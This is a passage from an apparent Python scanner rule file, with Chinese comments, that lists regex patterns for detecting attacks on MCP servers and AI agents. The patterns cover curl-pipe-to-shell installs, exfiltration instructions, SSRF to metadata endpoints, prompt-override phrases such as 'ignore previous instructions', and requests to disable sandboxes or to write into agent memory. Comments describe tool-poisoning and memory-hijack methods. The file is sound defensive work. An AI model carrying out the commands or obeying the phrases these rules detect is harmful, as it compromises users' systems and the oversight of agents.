"""
AIShield 扫描规则 v4.2 — 双维对齐 OWASP MCP Top 10 (2025 v0.1) + OWASP Agentic AI Top 10 (2025)

OWASP MCP Top 10 (2025 v0.1) 真实映射:
  MCP01 - Improper Token & Secret Management (令牌管理不当与密钥暴露)
  MCP02 - Privilege Scope Creep Leading to Escalation (权限范围蔓延导致提权)
  MCP03 - Tool Poisoning (工具投毒)
  MCP04 - Software Supply Chain Attack & Dependency Tampering (软件供应链攻击与依赖篡改)
  MCP05 - Command Injection & Execution (命令注入与执行)
  MCP06 - Intent Flow Subversion / Prompt Injection (意图流颠覆/上下文提示注入)
  MCP07 - Insufficient Authentication & Authorization (身份认证与授权不足)
  MCP08 - Lack of Audit & Observability (审计与可观测性缺失)
  MCP09 - Shadow MCP Servers (影子MCP服务器)
  MCP10 - Context Injection & Over-Sharing (上下文注入与过度共享)

规则统计目标: MCP 10类 × 6条 + Agentic(AIS) 10类 × 6条 = 120+ 规则
"""

import json
import re

# ============================================================
# OWASP MCP Top 10 真实定义 (2025 v0.1)
# ============================================================
OWASP_MCP_TOP10 = {
    "MCP01": {
        "name": "Improper Token & Secret Management",
        "name_cn": "令牌管理不当与密钥暴露",
        "severity": "critical",
        "description": "API密钥、认证令牌、数据库凭据等敏感信息硬编码或泄露"
    },
    "MCP02": {
        "name": "Privilege Scope Creep Leading to Escalation",
        "name_cn": "权限范围蔓延导致提权",
        "severity": "high",
        "description": "工具请求超出必要的权限（文件系统、网络、系统命令等）"
    },
    "MCP03": {
        "name": "Tool Poisoning",
        "name_cn": "工具投毒",
        "severity": "critical",
        "description": "工具描述中嵌入隐藏恶意指令，利用零宽字符、Unicode转义等方式"
    },
    "MCP04": {
        "name": "Software Supply Chain Attack & Dependency Tampering",
        "name_cn": "软件供应链攻击与依赖篡改",
        "severity": "high",
        "description": "恶意依赖包、npm/pypi供应链攻击、postinstall脚本恶意代码"
    },
    "MCP05": {
        "name": "Command Injection & Execution",
        "name_cn": "命令注入与执行",
        "severity": "critical",
        "description": "用户输入直接传入命令执行函数，导致远程代码执行"
    },
    "MCP06": {
        "name": "Intent Flow Subversion / Prompt Injection",
        "name_cn": "意图流颠覆/上下文提示注入",
        "severity": "high",
        "description": "通过提示注入篡改Agent意图流，绕过安全限制"
    },
    "MCP07": {
        "name": "Insufficient Authentication & Authorization",
        "name_cn": "身份认证与授权不足",
        "severity": "medium",
        "description": "MCP服务器缺少认证机制，或授权粒度过粗"
    },
    "MCP08": {
        "name": "Lack of Audit & Observability",
        "name_cn": "审计与可观测性缺失",
        "severity": "high",
        "description": "缺少日志记录、操作审计和异常检测机制"
    },
    "MCP09": {
        "name": "Shadow MCP Servers",
        "name_cn": "影子MCP服务器",
        "severity": "medium",
        "description": "未经授权的MCP服务器运行，绕过安全管控"
    },
    "MCP10": {
        "name": "Context Injection & Over-Sharing",
        "name_cn": "上下文注入与过度共享",
        "severity": "medium",
        "description": "将过多敏感上下文传递给外部工具/模型，导致数据泄露"
    },
}

# ============================================================
# MCP01 - 令牌管理不当与密钥暴露 (8条规则)
# ============================================================
MCP01_RULES = {
    # API密钥
    r'\b(api[_-]?key|apikey)\s*[=:]\s*["\'][^"\']{8,}["\']': ("硬编码API密钥", "critical"),
    r'sk-[0-9a-zA-Z]{32,}': ("OpenAI API Key泄露", "critical"),
    r'sk-ant-[0-9a-zA-Z]{40,}': ("Anthropic API Key泄露", "critical"),
    r'(?:AKIA|AGPA|AIDA|AROA|AIPA|ANPA|ANVA|ASIA)[0-9A-Z]{16}': ("AWS Access Key泄露", "critical"),
    r'ghp_[0-9a-zA-Z]{36}': ("GitHub Personal Access Token泄露", "critical"),
    r'gho_[0-9a-zA-Z]{36}': ("GitHub OAuth Token泄露", "critical"),
    r'glpat-[0-9a-zA-Z\-]{20,}': ("GitLab Personal Access Token泄露", "critical"),
    # 密码/Token
    r'\b(secret|password|passwd|pwd)\s*[=:]\s*["\'][^"\']{4,}["\']': ("硬编码密码", "critical"),
    r'\b(token|bearer|auth[_-]?token)\s*[=:]\s*["\'][A-Za-z0-9._\-]{16,}["\']': ("硬编码Token", "critical"),
    # 私钥
    r'-----BEGIN (?:RSA |EC |DSA |OPENSSH )?PRIVATE KEY-----': ("私钥文件暴露", "critical"),
    # 数据库连接串
    r'(?:mongodb|postgres|postgresql|mysql|redis)://[^\s\'"]+:[^\s\'"]+@': ("数据库连接字符串含密码", "critical"),
    # 其他凭证
    r'\bBasic\s+[A-Za-z0-9+/=]{16,}': ("HTTP Basic认证凭据", "high"),
    r'\bBearer\s+[A-Za-z0-9._\-]{16,}': ("Bearer Token暴露", "high"),
    r'xox[bpras]-[0-9a-zA-Z\-]{20,}': ("Slack Token泄露", "critical"),
    r'hooks\.slack\.com/services/T[A-Z0-9]{8,}/B[A-Z0-9]{8,}/[A-Za-z0-9]{20,}': ("Slack Webhook URL泄露", "high"),
    r'eyJ[A-Za-z0-9-_]+\.eyJ[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+': ("JWT Token泄露", "high"),
}

# ============================================================
# MCP02 - 权限范围蔓延导致提权 (8条规则)
# ============================================================
MCP02_RULES = {
    # 通配符权限
    r'\bpermissions?\s*[:=]\s*["\']\*["\']': ("通配符权限声明(过宽)", "high"),
    r'\bpermissions?\s*[:=]\s*["\']all["\']': ("all权限声明(过宽)", "high"),
    r'\ballow\s*[:=]\s*["\']\*["\']': ("通配符allow(过宽)", "high"),
    r'\bhost_permissions?\s*[:=]\s*\[\s*["\']<all_urls>["\']': ("所有URL权限(过宽)", "high"),
    r'\bfs\.(read|write|append|unlink|rmdir|mkdir|rename|copyFile)\b': ("完整文件系统权限", "medium"),
    r'\bos\.(remove|rename|makedirs|listdir|chdir|chmod|chown)\b': ("OS文件操作权限(过宽)", "medium"),
    r'\bPath\([^)]*\)\.(write_text|write_bytes|unlink|rmdir)\b': ("Pathlib完整操作权限", "medium"),
    r'\bshutil\.(rmtree|copy|move)\b': ("shutil高危文件操作", "high"),
    r'\bchmod\s*\(\s*0?[67]?77': ("chmod 777权限(过宽)", "high"),
    r'\b(os\.environ|process\.env)\b': ("完整环境变量访问", "low"),
    r'\bprocess\.env\.(HOME|USERPATH|PATH)\b': ("系统路径环境变量访问", "medium"),
    r'\bcredentials?\s*[:=]': ("凭据处理(需最小权限)", "medium"),
    # 工具级"任何文件/任何路径"访问（无边界声明）
    r'(?i)\bdescription\s*[:=]\s*["\'][^"\']*\bany\s+file\b[^"\']*["\']': ("工具声明any file访问(权限范围过宽)", "high"),
    r'(?i)\b(?:read|write|list|scan|access)\b[^{};\n"]{0,30}\bany\s+(?:file|path|file[^\"]*)\b': ("访问任意文件/路径的过宽声明", "high"),
}

# ============================================================
# MCP03 - 工具投毒 (8条规则)
# ============================================================
MCP03_RULES = {
    # 零宽字符
    r'[\u200b\u200c\u200d\u2060\ufeff]': ("零宽字符(可能隐藏恶意指令)", "critical"),
    # HTML注释隐藏指令
    r'<!--.*?(ignore|exec|eval|system|fetch|forget|jailbreak|bypass).*?-->': ("HTML注释中隐藏恶意指令", "critical"),
    # 块注释隐藏指令
    r'/\*.*?(ignore|exec|eval|system|fetch).*?\*/': ("块注释中隐藏恶意指令", "critical"),
    # 工具描述嵌入指令
    r'tool_description\s*[:=]\s*["\'].*?(ignore|exec|eval|fetch|forget|bypass)': ("工具描述中嵌入恶意指令", "critical"),
    r'\bdescription\s*[:=]\s*["\'][^"\']{500,}': ("异常长的工具描述(>500字符，可能隐藏指令)", "medium"),
    # Unicode转义
    r'\\u[0-9a-fA-F]{4}.*\\u[0-9a-fA-F]{4}.*\\u[0-9a-fA-F]{4}.*(ignore|exec|eval|system)': ("Unicode转义序列隐藏指令", "critical"),
    # 隐藏指令关键词
    r'\bhidden\s+(instruction|command|prompt)\b': ("隐藏指令关键词", "critical"),
    # HTML实体编码
    r'&#\d+;.*?(ignore|exec|eval|system|fetch|forget|bypass)': ("HTML实体编码隐藏指令", "critical"),
    # 递归/自我扩展式 prompt（消耗 LLM 上下文）
    r'(?i)\b(?:continue\s+prompt(?:ing)?|keep\s+prompt(?:ing)?|loop\s+prompt(?:ing)?|recur(?:sive|sively)\s+call|prompt\s+until)\b.{0,80}\b(?:context|token|budget)\b': ("递归prompt耗尽上下文(资源消耗)", "high"),
    # 工具名占用 agent 系统命名空间（system_prompt / tool_use / message_start 等）
    r'(?i)\bname\s*[:=]\s*["\'](?:system[_\s-]?prompt|tool[_\s-]?use|message[_\s-]?start|system[_\s-]?instructions?|assistant[_\s-]?turn)\b': ("工具名与agent内建冲突", "medium"),
    # 2026-10-02：能力自声明式投毒。工具/技能对外宣称"能生成 exploit / shellcode"，
    # 这类描述会被下游 agent 当作可信能力清单读走（tool poisoning 的一个变体：
    # 不藏指令，而是把攻击能力包装成卖点）。
    # 只认**祈使式生成动词 + 攻击宾语**，与「扫描器自述检测能力」严格区分 ——
    # BENIGN_CORPUS 里 "Generates SSH key pairs…"(#28) / "Scans uploaded files for
    # malware signatures"(#20) 都带攻击宾语但动词不是生成类，不命中。
    # 中英文都要覆盖：仓库自身与 distribution 文档大量使用中文。
    r'(?i)\b(?:generate|generates|generating|produce|produces|producing|creates?|creating|build|builds|building)\b[^.\n]{0,32}?\b(?:working\s+)?(?:exploit|shellcode|payload|0[- ]?day|rce|reverse\s+shell|keylogger|malware|ransomware|botnet|trojan|后门|木马|漏洞利用|-shellcode|利用代码)\b': ("工具/技能自声明可生成攻击载荷(投毒式能力声明,供应链双用途)", "high"),
}

# ============================================================
# MCP04 - 软件供应链攻击与依赖篡改 (8条规则)
# ============================================================
MCP04_RULES = {
    # postinstall/preinstall恶意脚本
    r'"(postinstall|preinstall|postpublish)"\s*:\s*["\'].*?(curl|wget|exec|eval|bash|sh|python|node\s+-e)': ("postinstall脚本执行外部命令", "critical"),
    r'"(postinstall|preinstall|postpublish)"\s*:\s*["\'].*?https?://': ("postinstall脚本访问网络", "high"),
    # 时间炸弹逻辑（借鉴 MK-ScorpioSec/mcp-scanner supply-chain 检查）
    r'(datetime|date|new\s+Date)\s*\(\s*20(2[5-9]|[3-9]\d)\s*,.{0,80}(execute|exec|eval|delete|encrypt|ransom|curl|wget|shred|format)': ("日期触发的执行/破坏逻辑(时间炸弹)", "high"),
    r'(execute|exec|eval|delete|encrypt|ransom)\b.{0,80}(datetime|Date\.now|time\.time|new\s+Date).{0,30}(>=|>|after|trigger)': ("执行逻辑绑定日期条件(时间炸弹)", "high"),
    r'(cron|schedule|crontab).{0,60}(rm\s+-rf|mkfs|shred|del\s+/[sSq]|format\s+[cC]:)': ("计划任务执行破坏性命令(定时炸弹)", "critical"),
    # pip install from git
    r'\bpip\s+install\s+git\+https?://': ("从git URL安装Python包(供应链风险)", "high"),
    r'\bnpm\s+install\s+git\+https?://': ("从git URL安装npm包(供应链风险)", "high"),
    # curl/wget 管道执行。2026-09-18 基线审计：两条曾被认为"互为冗余"，实测
    # 各命中不同的正样本（curl_pipe 命中 lifecycle hook 样本，wget_pipe 此前
    # 0 命中是语料缺样本，已补），且引用场景由 analyze() 的 citation 抑制处理，
    # 所以两条都保留。
    r'\bcurl\s+.*\|\s*(bash|sh|python|node)\b': ("curl管道执行(供应链攻击)", "critical"),
    r'\bwget\s+.*\|\s*(bash|sh|python|node)\b': ("wget管道执行(供应链攻击)", "critical"),
    # 远程代码执行
    r'\b(exec|eval)\s*\(\s*(urlopen|requests\.get|fetch)\b': ("远程代码eval/exec执行", "critical"),
    # npx远程执行
    r'\b(npx|npm\s+exec)\s+[^"\']*https?://': ("npx执行远程URL包", "high"),
    # 通配符版本
    r'"(dependencies|devDependencies)".*?"(\w+)"\s*:\s*["\'](\*|latest|>\s*\d)\s*["\']': ("依赖使用通配符版本(供应链风险)", "medium"),
    # pip/npm install 命令行中携带可疑包名（大小写混淆 / 数字冒充字母）
    r'(?i)\b(pip3?\s+install|npm\s+install|yarn\s+add|pnpm\s+add|uv\s+add|poetry\s+add)\s+[a-z0-9_\-]*[c1]\w[a-z0-9_\-]*\b': ("install命令携带可疑包名(大小写混淆)", "high"),
}

# ============================================================
# MCP05 - 命令注入与执行 (8条规则)
# ============================================================
MCP05_RULES = {
    # Python
    r'\bos\.system\s*\(': ("os.system() 命令执行", "critical"),
    r'\bos\.popen\s*\(': ("os.popen() 命令执行", "critical"),
    r'\bos\.exec\s*\(': ("os.exec() 命令执行", "critical"),
    r'\bsubprocess\.(run|call|Popen|check_output|check_call)\s*\([^)]*shell\s*=\s*True': ("subprocess shell=True(极危险)", "critical"),
    r'\bsubprocess\.(run|call|Popen|check_output)\s*\(': ("subprocess命令执行", "high"),
    r'\bexec\s*\(': ("exec() 动态代码执行", "critical"),
    r'\beval\s*\(': ("eval() 动态代码执行", "critical"),
    r'\b__import__\s*\(': ("Python __import__动态导入", "high"),
    r'\bimportlib\.import_module\s*\(': ("importlib动态导入", "medium"),
    r'\bpickle\.loads?\s*\(': ("Pickle反序列化(RCE风险)", "critical"),
    r'\byaml\.load\s*\(\s*[^)]*\)': ("yaml.load不安全反序列化", "critical"),
    r'\bmarshal\.loads?\s*\(': ("marshal反序列化(RCE风险)", "high"),
    r'\bctypes\.(CDLL|POINTER|cast)\b': ("ctypes FFI调用(内存安全风险)", "high"),
    # Node.js
    r'\bchild_process\.exec\s*\(': ("Node.js child_process.exec", "high"),
    r'\bchild_process\.execSync\s*\(': ("Node.js child_process.execSync", "high"),
    r'\bchild_process\.spawn\s*\(': ("Node.js child_process.spawn", "high"),
    r'\bFunction\s*\(\s*["\']': ("Function构造器动态执行", "critical"),
    r'\bvm\.runInNewContext\s*\(': ("VM沙箱逃逸风险", "critical"),
    r'\bvm\.runInThisContext\s*\(': ("VM沙箱逃逸风险", "critical"),
    r'\brequire\s*\(\s*[^\'"]': ("Node.js require动态导入", "high"),
    # Deno
    r'\bdeno\.(Command|run)\b': ("Deno命令执行", "high"),
    # SQL注入
    r'\bexecute\s*\(\s*f["\']': ("f-string SQL注入风险", "high"),
    r'\bexecute\s*\(\s*["\'].*\+\s*': ("字符串拼接SQL注入风险", "high"),
    # 弱加密
    r'\b(Crypto|Cryptodome)\.Cipher\.(DES|ARC4|RC4)\b': ("弱加密算法", "high"),
    # SSRF：工具 fetch 任意 URL + 云元数据端点
    r'(?i)\bdescription\s*[:=]\s*["\'][^"\']*\bfetch[^"\']*any\s+url\b[^"\']*["\']': ("工具声明任意URL抓取(SSRF风险)", "high"),
    r'(?i)(http|https)://169\.254\.169\.254(?:/[^"\s\]}]*)?': ("访问云元数据端点(SSRF泄露凭证)", "critical"),
    r'(?i)(http|https)?://\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}(?:/[^"\s\]}]*)?(?=/latest/meta-data/)': ("内网元数据路径访问(SSRF)", "critical"),
}

# ============================================================
# MCP06 - 意图流颠覆/上下文提示注入 (8条规则)
# ============================================================
MCP06_RULES = {
    # 越狱指令。2026-09-18 基线审计：本段原有 3 条规则命中同一条正样本
    # （"Ignore all previous instructions..."）—— 静态 ignore_static、情报生成
    # 的 ignore_intel、以及 (disregard|ignore|neglect) 变体。三条互为近似的
    # 并集已合并为一条，消除 finding 双倍/三倍计数；情报侧同名规则由
    # scripts/intel_to_rules.py 的去重逻辑跳过，不再进入 ALL_RULES。
    # forget 单独成条（见下一行）以避免 "forget previous instructions" 双重命中。
    r'(?i)(ignore|disregard|neglect)\s+(all\s+)?(the\s+)?(previous|prior|above|all)\s+(instruction|prompt|rule|guidance|safety)': ("越狱指令: 忽略/覆盖前文指令", "critical"),
    r'forget\s+(everything|all|previous|prior|your)\s+(instruction|prompt|rule|training)': ("越狱指令: 忘记一切", "critical"),
    # 越狱词提及。原 \b(DAN|jailbreak|bypass|override)\b 与 (越狱|jailbreak|越狱模式)
    # 是两条 critical 级裸关键字，唯一正样本是叙述句而非祈使载荷，且与中文段的
    # (?<![A-Za-z])DAN(?![A-Za-z])(?:模式)? 重合。按"提及≠执行"降级为 info：
    # 工具描述里出现 jailbreak 仍是 tool poisoning 的信号，值得标记，但不该按
    # critical 级执行载荷对待。
    # DAN 作为具体标识符由 ZH_PROMPT_INJECTION_RULES 保持 critical。
    r'(?i)\bjailbreak\b|越狱': ("越狱词提及(非执行载荷)", "info"),
    r'you\s+are\s+now\s+(a|an)\s+': ("身份切换指令", "high"),
    r'(act|pretend|play|roleplay)\s+as\s+(if\s+you\s+(are|were)\s+)?(a|an)\s+': ("角色扮演注入", "high"),
    # 系统提示窃取
    r'(reveal|show|print|output|display)\s+(your\s+)?(system\s+)?(prompt|instruction|rule|guidance)': ("系统提示窃取", "high"),
    r'system\s*prompt\s*[:=]': ("系统提示词暴露/覆盖", "high"),
    # 伪标签注入
    r'<system>|<instruction>|<override>|<admin>': ("伪XML标签注入", "critical"),
    # 数据外传指令
    r'(send|upload|exfiltrate|transmit|post)\s+.*\b(data|content|file|secret|key|password|token)\b.*\b(to|2|→)\s+https?://': ("数据外传指令", "critical"),
    # 隐蔽通道
    r'(download|fetch|curl|wget)\s+https?://[^\s]*\.(py|js|sh|bash|exe|ps1)': ("从外部下载可执行文件", "high"),
    # 监控/录制
    r'\bkeylog|screen.?capture|record.?audio|webcam.?access': ("监控/录制行为", "critical"),
    # 持久化
    r'(persist|autostart|launch.?agent|cron|systemd)\b': ("持久化/自启动指令", "high"),
    # 安全防护禁用
    r'(disable|bypass|turn.?off)\s+(firewall|antivirus|security|defender|protection)': ("安全防护禁用指令", "critical"),
}

# ============================================================
# MCP07 - 身份认证与授权不足 (6条规则)
# ============================================================
MCP07_RULES = {
    # 无认证的敏感端点
    r'(app\.(get|post|put|delete|route)|router\.(get|post|put|delete))\s*\(\s*["\']/(admin|config|settings|users|tokens|keys)': ("敏感管理端点无认证装饰器", "high"),
    r'@app\.route.*admin.*': ("管理路由可能缺少认证", "medium"),
    # SSL/TLS问题
    r'verify\s*=\s*False': ("SSL证书验证禁用", "critical"),
    r'verify\s*=\s*None': ("SSL证书验证禁用", "critical"),
    r'rejectUnauthorized\s*=\s*false': ("Node.js SSL验证禁用", "critical"),
    r'NODE_TLS_REJECT_UNAUTHORIZED\s*=\s*[\'"]?0': ("全局SSL验证禁用", "critical"),
    r'INSECURE\s*=\s*True': ("不安全模式启用", "high"),
    # CORS通配
    r'(Access-Control-Allow-Origin|cors)\s*[:=]\s*["\']?\*["\']?': ("CORS设置为通配符(无跨域限制)", "high"),
    # 无大小上限的上传/处理（DoS 入口）
    r'(?i)\b(max_?(?:size|bytes|body|length)|body_?limit|upload_?limit|file_?size_?limit|payload_?limit|request_?body_?limit|transfer_?size)\s*[:=]\s*["\']?(?:unlimited|-1|0|null|infinity|inf)\b': ("上传/处理无大小上限(DoS风险)", "high"),
    r'(?i)\bdescription\s*[:=]\s*["\'][^"\']*\bany\s+(?:size|length|number)\b[^"\']*["\']': ("工具声明无上限(DoS风险)", "high"),
}

# ============================================================
# MCP08 - 审计与可观测性缺失 (6条规则)
# ============================================================
MCP08_RULES = {
    # 无日志记录的敏感操作 — 通过检测缺少logging模式来间接发现
    r'\b(exec|eval|system|subprocess|child_process)\s*\(': ("命令执行操作(需验证是否有日志)", "medium"),
    # 缺少错误处理的网络请求
    r'\b(requests\.(get|post)|fetch|axios\.(get|post))\s*\([^)]*\)\s*;?\s*$': ("网络请求无错误处理(可能缺少审计)", "low"),
    # 静默异常
    r'except(\s*:)?:?\s*pass\s*$': ("静默异常处理(吞掉错误，影响审计)", "medium"),
    r'except\s+Exception\s*:\s*pass': ("裸异常捕获并忽略", "high"),
    r'\bprint\s*\(': ("使用print而非logging(缺少结构化审计)", "info"),
    r'console\.log\s*\(': ("使用console.log而非结构化日志", "info"),
}

# ============================================================
# MCP09 - 影子MCP服务器 (6条规则)
# ============================================================
MCP09_RULES = {
    # 动态MCP服务器配置
    r'mcpServers\s*[=:]\s*\{': ("MCP服务器配置(检查是否为影子服务器)", "info"),
    r'"command"\s*:\s*["\'].*?(npx|npm|node|python)\b': ("通过npx/npm/node/python启动MCP服务器", "medium"),
    r'"url"\s*:\s*["\']https?://': ("远程MCP服务器URL配置", "medium"),
    # 动态添加服务器
    r'addServer|registerServer|addMcpServer|mcp\.connect': ("动态注册MCP服务器(可能为影子)", "medium"),
    # 非标准端口
    r':\d{4,5}\b': ("非标准端口服务(检查是否为未授权MCP)", "low"),
    # stdio传输的外部进程
    r'StdioServerTransport\s*\(\s*\w+\.\s*(spawn|exec|Popen)': ("MCP stdio传输启动外部进程", "medium"),
    # 影子/未认证的外部 MCP 服务器（http 明文 + 无鉴权）
    r'(?i)"url"\s*:\s*"http://[^"]*"\s*[,}]': ("明文HTTP连接MCP服务器(无传输加密)", "high"),
    r'(?i)(mcpServers|servers)\s*:\s*\{[^{}]*"url"\s*:\s*"http://[^"]*"[^{}]*\}': ("明文HTTP部署MCP服务器清单", "high"),
}

# ============================================================
# MCP10 - 上下文注入与过度共享 (6条规则)
# ============================================================
MCP10_RULES = {
    # SSRF
    r'\b(requests|httpx|axios|fetch|http\.|https\.)\s*\(\s*["\']?\s*(http|https)://': ("HTTP请求(检查目标是否为内部服务)", "medium"),
    r'\b(localhost|127\.0\.0\.1|0\.0\.0\.0|169\.254\.169\.254)\b': ("内网/元数据地址访问(SSRF)", "critical"),
    r'\bmetadata\.google\.internal\b': ("GCP元数据服务访问(SSRF)", "critical"),
    r'\b100\.64\.\d+\.\d+\b': ("CGNAT内部地址访问(SSRF)", "high"),
    # 过度数据共享
    r'\bcontext_window|context_length|max_tokens\s*[:=]\s*\d{4,}': ("大上下文窗口(注意过度共享)", "info"),
    # WebSocket持久连接
    r'\b(new\s+)?WebSocket\s*\(': ("WebSocket连接(可能用于数据外泄)", "medium"),
    # DNS隧道
    r'\bDNS\s*(exfil|tunnel|over)\b': ("DNS隧道数据外传", "critical"),
    # ReDoS：schema 正则中的嵌套量词（借鉴 Latteflo/mcp-scanner MCP-DOS-002）
    # evil 形态 = 组内含量词且组后紧跟量词，如 (a+)+ 、([a-z]+)*$
    r'"pattern"\s*:\s*"[^"]*\([^()]*[*+{][^()]*\)\s*[*+{]': ("schema正则含嵌套量词(ReDoS风险)", "medium"),
}

# ============================================================
# Skill/GPT/Prompt 专用额外规则
# ============================================================
SKILL_EXTRA_RULES = {
    # ---- 基础操作类（原有） ----
    r'(write|create|delete|remove)\s+file': ("文件操作指令", "medium"),
    r'(access|read|send).*(contact|calendar|location|camera|microphone)': ("隐私数据访问指令", "high"),
    r'(encrypt|ransom|lock).*(file|data|disk)': ("勒索/加密行为", "critical"),
    r'(spread|propagate|infect|replicate)\b': ("自我传播行为", "critical"),
    r'(elevate|privilege|sudo|root|admin).*(access|permission|escalat)': ("权限提升指令", "critical"),
    r'api[_-]?key|secret[_-]?key|access_token': ("敏感凭证请求", "high"),

    # ---- 供应链 / 依赖注入（借鉴 OpenSquilla 生态 + limbo-ai 装脚本模式）----
    # `curl | sh` / `wget | bash` 是最经典的供应链投毒入口，SKILL.md 里出现
    # 就是让 agent 拉外部脚本执行，比 prompt injection 更难拦（agent 会当
    # 常规安装步骤照做）。
    r'(curl|wget)\s+[^\n|]*\|\s*(bash|sh|zsh|python)': ("供应链投毒: 远程脚本管道执行", "critical"),
    r'npx\s+(?:-p\s+\S+\s+)?(?:add|skills\s+add|skills\s*use)\s+\S+': ("供应链投毒: npx 从未审计源安装 skill", "high"),
    # 未审计 npm/pypi 包硬编码进 skill 的 install 步骤
    r'(pip|pip3)\s+install\s+(?:--index-url\s+\S+\s+)?\S+'
    r'|npm\s+install\s+(?:--registry\s+\S+\s+)?\S+'
    r'|pnpm\s+add\s+\S+'
    r'|yarn\s+add\s+\S+': ("供应链投毒: 依赖源可能未审计", "medium"),
    # 第三方 MCP server 自动注册到 .mcp.json / mcpServers（供应链升级路径）
    r'(mcpServers|mcp_servers)\s*[:=]'
    r'|claude\s+plugin\s+marketplace\s+add\s+\S+'
    r'|\.mcp\.json.*(?:add|install|register)'
    r'|openchiip-harness\s+init'
    r'|opensquilla\s+install': ("供应链升级: skill 试图自动注册 MCP/Plugin", "high"),

    # ---- 上下文劫持 / 自我修改（借鉴 RSIAgent 自曝的 verifier 漏洞 + limbo-ai vault 暴露）----
    # 让 agent 修改自身 SKILL.md / plugin.json / settings.json / memory。这是
    # 自我进化类框架（RSI / OpenSquilla MetaSkills / OpenChiip MetaSkill）最
    # 常见被攻击面：伪造一次"经验"写死，后续所有任务都被劫持。
    r'(edit|update|modify|rewrite|overwrite)\s+(?:your\s+|the\s+|this\s+|./)?'
    r'(?:SKILL\.md|plugin\.json|marketplace\.json|settings\.json|\.mcp\.json|'
    r'\.claude/settings\.json|AGENTS\.md|CLAUDE\.md|system\.prompt)':
        ("上下文劫持: skill 试图修改自身配置", "critical"),
    # 让 agent 写自身 memory / blackboard / state（RSI 类框架的攻击点）
    # 覆盖三种表达："write X to your long-term memory" / "add this to memory" /
    # "remember X"（RSI 的 verifier 漏洞：一次被批准的错误经验就写死）
    r'(?:'
    r'(write|add|append|inject|remember|store|save)\s+(?:this|that|the\s+\S+|anything)?'
    r'\s*(?:to|into)\s+(?:your\s+|the\s+|my\s+|its\s+|long[- ]?term\s+)*'
    r'(?:memory|blackboard|state\s*file|experience\s*bank|memory\s*bank|'
    r'personal\s+preferences|preferences|rules|settings)'
    r'|'
    r'(?:add|include)\s+this\s+(?:instruction|rule|directive)'
    r'\s+(?:to|into)\s+(?:your|the|my)\s+(?:memory|preferences|rules)'
    r')':
        ("上下文劫持: skill 试图写入 agent 记忆", "high"),
    # 让 agent 加载另一个 skill / MetaSkill（横向信任）
    r'(load|install|add|fetch|pull)\s+(?:another\s+|the\s+|that\s+|external\s+)?'
    r'(skill|metaskill|meta[- ]?skill|plugin)'
    r'|npx\s+skills\s+(?:add|use)\s+\S+'
    r'|\/plugin\s+install\s+\S+'
    r'|install\s+(?:the\s+)?(?:skill|plugin)\s+at\s+\S+':
        ("上下文劫持: skill 试图加载其他 skill", "high"),
    # 让 agent 触发 channel / identity 切换（OpenSquilla/OpenChiip 元能力）
    r'(switch|change)\s+(?:the\s+)?(?:channel|identity|provider|gateway|persona)'
    r'|set\s+(?:channel|identity|provider|gateway)\s*[:=]'
    r'|override\s+(?:channel|identity|provider|gateway)':
        ("Harness 元能力滥用: 试图替换 channel/identity/provider", "high"),
    # 让 agent 修改 sandbox 策略 / 关闭安全护栏
    r'(disable|bypass|turn\s+off|skip|suspend)'
    r'\s+(?:the\s+)?(?:sandbox|security\s*guard|guardrail|approval\s*flow|'
    r'credential\s*scrubbing|credential\s*redact|pre[- ]?hook|post[- ]?hook)':
        ("Harness 元能力滥用: 试图绕过沙箱/护栏", "critical"),

    # ---- 中文供应链 / 上下文劫持（中文 skill 生态差异化）----
    r'(下载|获取|拉取|安装).{0,10}(外部|第三方|远程).{0,6}(脚本|程序|包|组件)':
        ("中文供应链: 引导 agent 拉外部脚本", "high"),
    r'(修改|更新|改写|覆盖).{0,6}(自身的|自己的|这个)?.{0,6}'
    r'(SKILL\.md|plugin\.json|配置|设置|记忆|黑板)':
        ("中文上下文劫持: 引导 agent 修改自身配置/记忆", "critical"),
    r'(加载|安装|引入).{0,6}(其他|另一个|外部).{0,6}(skill|技能|插件)':
        ("中文上下文劫持: 引导 agent 加载其他 skill", "high"),
    r'(关闭|禁用|跳过|绕过|取消).{0,8}(沙箱|sandbox|护栏|approval|审批流|脱敏|pre[- ]?hook|post[- ]?hook|凭证剥离|credential.{0,4}scrub)':
        ("中文Harness滥用: 引导 agent 绕过沙箱/护栏", "critical"),

    # ---- 未复现 benchmark 声称（借鉴 PenguinHarness 未开源 benchmark 事件）----
    # 2026-09-21 案例：PenguinHarness 宣称 Agent 准确率 50%→90%、成本 = Claude
    # Code 的 1/70，但 FollowAgents 审计指出其 benchmark 尚未公开，"100x/1-70
    # cost/$0.02" 等数字无法独立验证。任何 skill/plugin 用无来源、无代码仓库、
    # 无数据集的量化提升做宣传，都是可疑营销——不是攻击载荷，但会让 agent
    # 用户误判可信度、放宽权限边界。降到 info 级只标记、不阻断，避免误伤。
    # 关键判据：出现数字提升/成本对比，但没有 URL、benchmark 名、repo、issue
    # 号等可复现锚点。这里保守匹配「明确性能指标名 + 两个百分比 + 提升动词」
    # 或「量化成本对比到具体模型名」——避免把防御文档中引用公开 benchmark
    # （OWASP / SWE-bench）的表述误报。
    r'(?:准确率|accuracy|success\s*rate).{0,25}\d+%?[^.\n]{0,15}'
    r'(?:到|→|->|提升|提高|improv|to)\s*\d+%?'
    r'|'
    r'(?:准确率|accuracy|success\s*rate).{0,15}'
    r'(?:提升到|提高到|reaches?|improves?|improved?|up\s+to)\s*\d+%?'
    r'|'
    r'(?:cost|成本|费用).{0,20}1\s*/\s*\d+\s*(?:的|of|than)?\s*(?:Claude|GPT|OpenAI|Gemini|Copilot)'
    r'|'
    r'(?:\b\d{2,5}\b)\s*(?:x|倍)\s*(?:cheaper|faster|better|cost|price)':
        ("未复现 benchmark 声称: 量化对比缺可复现来源", "info"),

    # ---- 桌面驱动工具调用（借鉴 Cua / Mano-CUA / Browser-Use / OpenCUA 生态）----
    # 端侧 GUI-VLA agent（Mano-CUA、OpenCUA）+ 桌面控制基础设施（Cua Driver、
    # Browser-Use、Playwright stealth）都能让 agent 在用户看不见或不注意的情况
    # 下点击"确认购买""转账""删除"。skill 里显式引用这类工具本身就是可疑信号，
    # 因为 agent 一旦信任 skill 就会调用它——用户不会看到后台的鼠标移动。
    # 匹配两类：安装/调用这些工具的显式指令 + MCP server 名。
    r'(pip|npm|brew)\s+(?:install|add)\s+'
    r'(?:cua|mano-cua|@1mcp/agent|browser-use|opencvui|pyautogui|pynput|'
    r'pyscreeze|playwright-stealth)'
    r'|'
    r'(cua-driver|cua\.driver|mano-cua|openclaw\s*driver)'
